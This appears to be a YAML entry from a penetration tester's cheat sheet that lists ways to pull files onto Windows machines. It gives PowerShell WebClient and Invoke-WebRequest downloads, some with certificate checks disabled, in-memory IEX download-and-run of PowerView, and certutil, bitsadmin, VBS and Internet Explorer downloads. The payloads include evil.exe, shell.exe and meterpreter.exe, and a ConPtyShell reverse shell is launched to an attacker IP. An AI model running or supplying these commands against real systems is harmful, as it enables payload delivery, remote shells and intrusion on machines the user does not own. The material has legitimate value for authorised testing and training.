---
functions:
  file-transfer:
    - description: Download Files on Windows
      code: |
        +++++++++++POWERSHELL+++++++++++

        powershell -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(New-Object System.Net.WebClient).DownloadFile('https://192.168.1.1:56789/svchosts.exe','svchosts.exe')"

        powershell -c iwr -Uri http://192.168.119.149:8000/task.xml -OutFile task.xml -usebasicparsing

        Invoke-Webrequest -Uri http://192.168.1.1:8080/sysupdate.exe -usebasicparsing

        powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')"

        Download and run IN MEM ONLY:
        IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.119.149/Invoke-TM.ps1'))
        IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.119.149:8000/PowerView.ps1'))
    
        Ignore Cert Trusts - [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
    
        (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.149/file.exe', 'here.exe')

        +++++++++++CERTUTIL+++++++++++

        certutil.exe -urlcache -f http://192.168.119.149:8000/task.xml task.xml
        certutil.exe -urlcache -f http://192.168.119.149:8000/Invoke-ConPtyShell.ps1 Invoke-ConPtyShell.ps1; Invoke-ConPtyShell 192.168.119.149 9999


        +++++++++++PS BITSADMIN+++++++++++

        Import-Module BitsTransfer
        Start-BitsTransfer -Source $url -Destination $output
        #OR
        Start-BitsTransfer -Source $url -Destination $output -Asynchronous


        +++++++++++BITSADMIN+++++++++++        

        Download:
        bitsadmin /create /download myjob
        bitsadmin /addfile myjob http://192.168.119.149/shell.exe c:\xampp\htdocs\shell.exe
        bitsadmin /resume myjob
        bitsadmin /reset
        bitsadmin /complete myjob


        +++++++++++VBS+++++++++++

        see wget.vbs

        Specific File [replace filenames]:
        echo Set o=CreateObject^("MSXML2.XMLHTTP"^):Set a=CreateObject^("ADODB.Stream"^):Set f=Createobject^("Scripting.FileSystemObject"^):o.open "GET", "http://<attacker ip>/meterpreter.exe", 0:o.send^(^):If o.Status=200 Then > "C:\temp\download.vbs" &echo a.Open:a.Type=1:a.Write o.ResponseBody:a.Position=0:If f.Fileexists^("C:\temp\meterpreter.exe"^) Then f.DeleteFile "C:\temp\meterpreter.exe" >> "C:\temp\download.vbs" &echo a.SaveToFile "C:\temp\meterpreter.exe" >>"C:\temp\download.vbs" &echo End if >>"C:\temp\download.vbs" &cscript //B "C:\temp\download.vbs" &del /F /Q "C:\temp\download.vbs"


        +++++++++++IE+++++++++++

        iexplorer.exe http://192.168.119.149:8000/1.bat
        iexplorer.exe http://192.168.119.149/task.xml
resources: |
  https://raw.githubusercontent.com/MidnightSeer/scripts/master/wget-windows

---
